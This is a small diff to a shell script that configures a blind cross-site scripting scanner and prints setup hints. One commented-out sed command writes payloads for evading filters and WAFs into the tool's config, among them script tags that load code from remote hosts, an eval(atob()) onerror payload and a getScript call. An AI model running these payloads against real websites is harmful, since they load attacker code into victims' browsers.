@@ -24,7 +24,7 @@ echo ""
 #sed "s,    '<sCriPt sRc=//14.rs>'\,,    'ceye.url'\,\n    '<sCriPt sRc=//14.rs>'\,\n    '\"><script src=blindxss></script>'\,\n    'httpceye.url/'\,,g" core/config.py > 1.txt ; mv 1.txt core/config.py ; sed "s,blindPayload = '',blindPayload = (  # Payloads for filter & WAF evasion\n    '\"><script src=blindxss></script>'\,\n    '\"><img src=xxssonerror=eval(atob(this.id))>'\,\n    '\<script>$.getScript(\"//xss\")</script>'),g" core/config.py > 1.txt ; mv 1.txt core/config.py
 head -24 /root/sh/du_hast.sh | tail -1
 echo ""
-echo "replace URL to your blind payload , then copy into /root/script/xss.sh."
+echo "replace URL to your blind payload , then copy into /root/script/xss.sh"
 echo "OR NOT, then run without potential blind vuln"
 echo "------"
 echo "screen -ls"
